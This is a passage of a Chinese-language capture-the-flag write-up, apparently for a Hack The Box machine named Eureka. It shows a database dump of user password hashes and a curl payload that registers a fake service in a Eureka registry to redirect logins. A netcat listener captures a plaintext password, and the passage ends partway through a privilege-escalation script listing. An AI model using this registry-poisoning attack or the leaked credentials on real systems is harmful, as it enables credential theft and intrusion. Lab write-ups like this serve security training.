class="comment"># Enable proxy support</span></span><br><span class="line">server.forward-headers-strategy=native</span><br><span class="line"><span class="comment"># Log</span></span><br><span class="line">logging.level.root=INFO</span><br><span class="line">logging.file.name=<span class="built_in">log</span>/application.log</span><br><span class="line">logging.file.path=./</span><br></pre></td></tr></table></figure>
<h3 id="mysql-emm"><a href="#mysql-emm" class="headerlink" title="mysql emm"></a>mysql emm</h3><p>显示的数据库也可以登录上去看一眼</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">oscar190@eureka:/var/www/web/user-management-service/src/main/resources$ mysql -uoscar190 -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 221</span><br><span class="line">Server version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| Furni_WebApp_DB    |</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use Furni_WebApp_DB</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [Furni_WebApp_DB]&gt; show tables;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Tables_in_Furni_WebApp_DB |</span><br><span class="line">+---------------------------+</span><br><span class="line">| SPRING_SESSION            |</span><br><span class="line">| SPRING_SESSION_ATTRIBUTES |</span><br><span class="line">| blogs                     |</span><br><span class="line">| cart                      |</span><br><span class="line">| cart_items                |</span><br><span class="line">| cart_product              |</span><br><span class="line">| cart_product_seq          |</span><br><span class="line">| cart_seq                  |</span><br><span class="line">| carts                     |</span><br><span class="line">| category                  |</span><br><span class="line">| category_seq              |</span><br><span class="line">| comment                   |</span><br><span class="line">| customer                  |</span><br><span class="line">| customer_seq              |</span><br><span class="line">| furniture                 |</span><br><span class="line">| product                   |</span><br><span class="line">| product_id                |</span><br><span class="line">| product_seq               |</span><br><span class="line">| <span class="built_in">users</span>                     |</span><br><span class="line">+---------------------------+</span><br><span class="line">19 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [Furni_WebApp_DB]&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+</span><br><span class="line">| <span class="built_in">id</span> | first_name | last_name | email                   | password                                                     | is_staff |</span><br><span class="line">+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+</span><br><span class="line">|  2 | Kamel      | Mossab    | k.mossab110@eloquia.htb | $2a$10<span class="variable">$J4yap5ZxviliZO9jBCuSdeD</span>.7LzL3/njVpNhnG85HCcwA05ulUrzW |        0 |</span><br><span class="line">|  4 | Lorra      | Barker    | lorra199@gmail.com      | $2a$10<span class="variable">$DgUDWpxipW2Yt7UcKxzvweB7FXoV</span>/LFxlJG8yuL56NyUMMLr5uBuK |        0 |</span><br><span class="line">|  5 | Martin     | Wood      | mwood@gmail.com         | $2a$10<span class="variable">$3LDYl5QEt4K4u8vLWMGH8eDA</span>/fNKVquhHNbyijaDzzueKHAwi6bHO |        0 |</span><br><span class="line">|  8 | Roberto    | Dalton    | roberto0xd@outlook.com  | $2a$10<span class="variable">$4TLCSlEfYrNDFfPDQ5z4p</span>.S6gImA8NKAGn2tyqLJyG71l9iQoTDhu |        0 |</span><br><span class="line">|  9 | Miranda    | Wise      | miranda.wise@furni.htb  | $2a$10<span class="variable">$T4L873JALnbXH10tq</span>.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |</span><br><span class="line">| 10 | Oscar      | Dalton    | oscar190@furni.htb      | $2a$10<span class="variable">$ye9a40a7KOyBJKUai2qxY</span>.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |</span><br><span class="line">| 11 | Nya        | Dalton    | nya190@furni.htb        | $2a$10<span class="variable">$GZQOgzb4N1xVs3ALpnuqGeId5</span>/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |</span><br><span class="line">| 12 | lucas      | carols    | logok12976@pelung.com   | $2a$10<span class="variable">$J93xmU0</span>.yP0/oZmoV9K4u.XvYHtl.kunSX9xoe2RACqKcitM4OjlC |        0 |</span><br><span class="line">| 15 | xxxxx      | <span class="built_in">test</span>      | xxxxx@fumi.htb          | $2a$10<span class="variable">$6Jrxh7fnMStxsYNFcwrUSu01QAql0g2qKiiU4vfLXJ9O</span>/dbgqGB2W |        0 |</span><br><span class="line">| 16 | xxxxx      | xxxxx     | xxxxx@furni.htb         | $2a$10<span class="variable">$D2djuGhIQFlIyp3WIbhOWe5tz3vGvgOfgyH</span>/kr1dj/ogbBOC7pMvW |        0 |</span><br><span class="line">+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+</span><br><span class="line">10 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不出意外这些不会出什么密码<br><img src="/images/eureka-8.png"><br>拉满啦</p>
<h3 id="fake-register-with-eureka"><a href="#fake-register-with-eureka" class="headerlink" title="fake register with eureka"></a>fake register with eureka</h3><p>现在整理一下，能点的地方只有<br><img src="/images/eureka-9.png"><br>好像有点悟了<br>尝试一下点击USER_MANAGEMENT_SERVICE的话，他会转到localhost:8081，这时候用nc接一下看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap -cAr nc -lvnp 8081</span><br><span class="line">Listening on 0.0.0.0 8081</span><br><span class="line">Connection received on 127.0.0.1 49136</span><br><span class="line">GET /actuator/info HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;133&quot;</span>, <span class="string">&quot;Not(A:Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;Linux&quot;</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/images/eureka/avif,/images/eureka/webp,/images/eureka/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1:8761/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: JSESSIONID=D0EAEED0F0ED6E1D59205FE33E6124A3</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那我们直接伪装一下，鞭打一下gpt<br><img src="/images/eureka-10.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v -X POST http://EurekaSrvr:0scarPWDisTheB3st@127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;                                                                 </span></span><br><span class="line"><span class="string">  &quot;instance&quot;: &#123;                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">    &quot;instanceId&quot;: &quot;USER-MANAGEMENT-SERVICE&quot;,                                                                                                                                                                       </span></span><br><span class="line"><span class="string">    &quot;hostName&quot;: &quot;xx.xx.xx.xx&quot;,                                                                                                                                                                                     </span></span><br><span class="line"><span class="string">    &quot;app&quot;: &quot;USER-MANAGEMENT-SERVICE&quot;,                                                                                                                                                                              </span></span><br><span class="line"><span class="string">    &quot;ipAddr&quot;: &quot;xx.xx.xx.xx&quot;,                                                                                                                                                                                       </span></span><br><span class="line"><span class="string">    &quot;vipAddress&quot;: &quot;USER-MANAGEMENT-SERVICE&quot;,                                                                                                                                                                       </span></span><br><span class="line"><span class="string">    &quot;secureVipAddress&quot;: &quot;USER-MANAGEMENT-SERVICE&quot;,                                                                                                                                                                 </span></span><br><span class="line"><span class="string">    &quot;status&quot;: &quot;UP&quot;,                                                                                                                                                                                                </span></span><br><span class="line"><span class="string">    &quot;port&quot;: &#123; &quot;$&quot;: 8081, &quot;@enabled&quot;: &quot;true&quot; &#125;,                                                                                                                                                                     </span></span><br><span class="line"><span class="string">    &quot;dataCenterInfo&quot;: &#123;                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">      &quot;@class&quot;: &quot;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo&quot;,                                                                                                                                          </span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;MyOwn&quot;                                                                                                                                                                                              </span></span><br><span class="line"><span class="string">    &#125;                                                                                                                                                                                                              </span></span><br><span class="line"><span class="string">  &#125;                                                                                                                                                                                                                </span></span><br><span class="line"><span class="string">&#125;&#x27;</span>                                                                                                                                                                                                                 </span><br><span class="line">Note: Unnecessary use of -X or --request, POST is already inferred.                                                                                                                                                </span><br><span class="line">*   Trying 127.0.0.1:8761...                                                                                                                                                                                       </span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8761                                                                                                                                                                     </span><br><span class="line">* using HTTP/1.x                                                                                                                                                                                                   </span><br><span class="line">* Server auth using Basic with user <span class="string">&#x27;EurekaSrvr&#x27;</span>                                                                                                                                                                   </span><br><span class="line">&gt; POST /eureka/apps/USER-MANAGEMENT-SERVICE HTTP/1.1                                                                                                                                                               </span><br><span class="line">&gt; Host: 127.0.0.1:8761                                                                                                                                                                                             </span><br><span class="line">&gt; Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==</span><br><span class="line">&gt; User-Agent: curl/8.13.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Type: application/json</span><br><span class="line">&gt; Content-Length: 457</span><br><span class="line">&gt; </span><br><span class="line">* upload completely sent off: 457 bytes</span><br><span class="line">&lt; HTTP/1.1 204 </span><br><span class="line">&lt; Vary: Origin</span><br><span class="line">&lt; Vary: Access-Control-Request-Method</span><br><span class="line">&lt; Vary: Access-Control-Request-Headers</span><br><span class="line">&lt; X-Content-Type-Options: nosniff</span><br><span class="line">&lt; X-XSS-Protection: 0</span><br><span class="line">&lt; Cache-Control: no-cache, no-store, max-age=0, must-revalidate</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Expires: 0</span><br><span class="line">&lt; X-Frame-Options: DENY</span><br><span class="line">&lt; Date: Mon, 28 Apr 2025 12:52:01 GMT</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host 127.0.0.1 left intact</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># nc 8081</span></span><br><span class="line">$ rlwrap -cAr nc -lvnp 8081</span><br><span class="line">Listening on 0.0.0.0 8081</span><br><span class="line">Connection received on 10.129.77.240 42032</span><br><span class="line">POST /login HTTP/1.1</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1,127.0.0.1</span><br><span class="line">X-Forwarded-Proto: http,http</span><br><span class="line">Content-Length: 168</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/images/eureka/avif,/images/eureka/webp,/images/eureka/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.8</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: SESSION=NzgxMjVmODItMzEwZi00MzY2LWI0ZmItYzc5YjVhOTgwZGU4</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64)</span><br><span class="line">Forwarded: proto=http;host=furni.htb;<span class="keyword">for</span>=<span class="string">&quot;127.0.0.1:56312&quot;</span></span><br><span class="line">X-Forwarded-Port: 80</span><br><span class="line">X-Forwarded-Host: furni.htb</span><br><span class="line">host: 10.10.16.18:8081</span><br><span class="line"></span><br><span class="line">username=miranda.wise%40furni.htb&amp;password=IL%21veT0Be%26BeT0L0ve&amp;_csrf=wa04iiapUgF4ifc0DKR3uRc2XUHdfloWPJmO8PD0RALaNTAA9ZVauhSdNGNVupEMb4lDjCdVcHi7TWo7Df3qwsnCcWfiU1E1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/images/eureka-11.png"><br>又得到一个user<br><strong>miranda.wise:IL!veT0Be&amp;BeT0L0ve</strong><br>尝试登录一下ssh<br><code>注：这里登录的话不是miranda.wise而是miranda-wise</code><br><img src="/images/eureka-12.png"></p>
<h2 id="shell-as-miranda-wise"><a href="#shell-as-miranda-wise" class="headerlink" title="shell as miranda-wise"></a>shell as miranda-wise</h2><p>他不是sudoer、、、<br>这不G了嘛<br>接着linpeas吧<br>要是再跟那个Eureka纠缠不清、、、</p>
<h3 id="log-analyse-sh-analyse"><a href="#log-analyse-sh-analyse" class="headerlink" title="log_analyse.sh analyse"></a>log_analyse.sh analyse</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Unexpected <span class="keyword">in</span> root                                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line">╔══════════╣ Modified interesting files <span class="keyword">in</span> the last 5mins (<span class="built_in">limit</span> 100)                                    </span><br><span class="line">/var/log/journal/05275fe65ca74999b42379fe4b17d273/user-1001@ca4502fd8dd44960aa0d41e72d74f8e6-000000000020b036-000633d665cd1c99.journal                                                                             </span><br><span class="line">/var/log/journal/05275fe65ca74999b42379fe4b17d273/user-1001@ca4502fd8dd44960aa0d41e72d74f8e6-0000000000201bde-000633d64fddfe0b.journal                                                                             </span><br><span class="line">/var/log/journal/05275fe65ca74999b42379fe4b17d273/system@c4d33b84ac324922a1dbe5e9e12d424f-00000000001f2ffd-000633d423793397.journal                                                                                </span><br><span class="line">/var/log/journal/05275fe65ca74999b42379fe4b17d273/user-1001.journal                                      </span><br><span class="line">/var/log/journal/05275fe65ca74999b42379fe4b17d273/system@c4d33b84ac324922a1dbe5e9e12d424f-0000000000208eeb-000633d665b85fd7.journal                                                                                </span><br><span class="line">/var/log/journal/05275fe65ca74999b42379fe4b17d273/user-1000.journal             </span><br><span class="line">/var/log/journal/05275fe65ca74999b42379fe4b17d273/system.journal  </span><br><span class="line">/var/log/laurel/audit.log.5                                                                              </span><br><span class="line">/var/log/laurel/audit.log.3                                                                              </span><br><span class="line">/var/log/laurel/audit.log.2                                                                              </span><br><span class="line">/var/log/laurel/audit.log.1                                                                              </span><br><span class="line">/var/log/laurel/audit.log                                                                                </span><br><span class="line">/var/log/laurel/audit.log.4                                                                              </span><br><span class="line">/var/log/auth.log                                                                                        </span><br><span class="line">/var/log/syslog                                                                                          </span><br><span class="line">/var/log/kern.log                                                                                        </span><br><span class="line">/var/www/web/cloud-gateway/log/application.log                                                           </span><br><span class="line">/var/www/web/user-management-service/log/application.log                                                                                                                                                           </span><br><span class="line">/tmp/hsperfdata_www-data/1822                                                                                                                                                                                      </span><br><span class="line">/tmp/hsperfdata_www-data/1114                                                                                                                                                                                      </span><br><span class="line">/tmp/hsperfdata_www-data/1322                                                                                                                                                                                      </span><br><span class="line">/tmp/hsperfdata_www-data/1326                    </span><br></pre></td></tr></table></figure>
<p>这里又是&#x2F;var&#x2F;www&#x2F;web&#x2F;，还标了红，看一看<br>没看出头绪，再往上翻可以看到一个</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Unexpected <span class="keyword">in</span> /opt (usually empty)                                                                                                                                                                    </span><br><span class="line">total 24                                                                                                                                                                                                           </span><br><span class="line">drwxr-xr-x  4 root root     4096 Mar 20 14:17 .                                                                                                                                                                    </span><br><span class="line">drwxr-xr-x 19 root root     4096 Apr 22 12:47 ..                                                                                                                                                                   </span><br><span class="line">drwxrwx---  2 root www-data 4096 Aug  7  2024 heapdump                                                                                                                                                             </span><br><span class="line">-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh                                                                                                                                                       </span><br><span class="line">drwxr-x---  2 root root     4096 Apr  9 18:34 scripts      </span><br></pre></td></tr></table></figure>
<p>有一个log_analyse.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment"># Colors</span></span><br><span class="line"> GREEN=<span class="string">&#x27;\033[0;32m&#x27;</span></span><br><span class="line"> RED=<span class="string">&#x27;\033[0;31m&#x27;</span></span><br><span class="line"> YELLOW=<span class="string">&#x27;\033[1;33m&#x27;</span></span><br><span class="line"> BLUE=<span class="string">&#x27;\033[0;34m&#x27;</span></span><br><span class="line"> CYAN=<span class="string">&#x27;\033[0;36m&#x27;</span></span><br><span class="line"> RESET=<span class="string">&#x27;\033[0m&#x27;</span></span><br><span class="line"> </span><br><span class="line"> LOG_FILE=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"> OUTPUT_FILE=<span class="string">&quot;log_analysis.txt&quot;</span></span><br><span class="line"> </span><br><span class="line"> <span class="built_in">declare</span> -A successful_users  <span class="comment"># Associative array: username -&gt; count</span></span><br><span class="line"> <span class="built_in">declare</span> -A failed_users      <span class="comment"># Associative array: username -&gt; count</span></span><br><span class="line"> STATUS_CODES=(<span class="string">&quot;200:0&quot;</span> <span class="string">&quot;201:0&quot;</span> <span class="string">&quot;302:0&quot;</span> <span class="string">&quot;400:0&quot;</span> <span class="string">&quot;401:0&quot;</span> <span class="string">&quot;403:0&quot;</span> <span class="string">&quot;404:0&quot;</span> <span class="string">&quot;500:0&quot;</span>) <span class="comment"># Indexed array: &quot;code:count&quot; pairs</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;RED&#125;</span>Error: Log file <span class="variable">$LOG_FILE</span> not found.<span class="variable">$&#123;RESET&#125;</span>&quot;</span></span><br><span class="line">     <span class="built_in">exit</span> 1</span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="title">analyze_logins</span></span>() &#123;</span><br><span class="line">     <span class="comment"># Process successful logins</span></span><br><span class="line">     <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">         username=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span> | awk -F<span class="string">&quot;&#x27;&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">         <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;successful_users[$username]+_&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">             successful_users[<span class="variable">$username</span>]=$((successful_users[<span class="variable">$username</span>] + <span class="number">1</span>))</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             successful_users[<span class="variable">$username</span>]=1</span><br><span class="line">         <span class="keyword">fi</span></span><br><span class="line">     <span class="keyword">done</span> &lt; &lt;(grep <span class="string">&quot;LoginSuccessLogger&quot;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span>)</span><br><span class="line"> </span><br><span class="line">     <span class="comment"># Process failed logins</span></span><br><span class="line">     <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">         username=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span> | awk -F<span class="string">&quot;&#x27;&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">         <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;failed_users[$username]+_&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">             failed_users[<span class="variable">$username</span>]=$((failed_users[<span class="variable">$username</span>] + <span class="number">1</span>))</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             failed_users[<span class="variable">$username</span>]=1</span><br><span class="line">         <span class="keyword">fi</span></span><br><span class="line">     <span class="keyword">done</span> &lt; &lt;(grep <span class="string">&quot;LoginFailureLogger&quot;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="title">analyze_http_statuses</span></span>() &#123;</span><br><span class="line">     <span class="comment"># Process HTTP status codes</span></span><br><span class="line">     <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">         code=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span> | grep -oP <span class="string">&#x27;Status: \K.*&#x27;</span>)</span><br><span class="line">         found=0</span><br><span class="line">         <span class="comment"># Check if code exists in STATUS_CODES array</span></span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!STATUS_CODES[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">             existing_entry=<span class="string">&quot;<span class="variable">$&#123;STATUS_CODES[$i]&#125;</span>&quot;</span></span><br><span class="line">             existing_code=$(<span 